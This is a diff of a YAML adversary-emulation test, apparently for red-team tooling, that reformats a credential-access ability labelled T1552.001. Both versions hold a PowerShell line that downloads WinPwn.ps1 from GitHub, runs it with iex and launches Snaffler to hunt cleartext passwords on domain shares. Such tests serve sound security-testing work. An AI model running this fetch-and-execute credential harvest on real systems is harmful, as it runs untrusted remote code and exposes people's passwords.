@@ -1,13 +1,15 @@
-- id: 01e15007-1d09-5bf0-9908-f3ad11dffbf7
+- requirements: []
   name: Soumaia ART Tests - WinPwn - Snaffler
   description: Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn
   tactic: credential-access
-  technique:
-    attack_id: T1552.001
-    name: 'Unsecured Credentials: Credentials In Files'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
-          Snaffler -noninteractive -consoleoutput
+  technique_id: T1552.001
+  technique_name: 'Unsecured Credentials: Credentials In Files'
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Snaffler -noninteractive -consoleoutput
+  id: 01e15007-1d09-5bf0-9908-f3ad11dffbf7
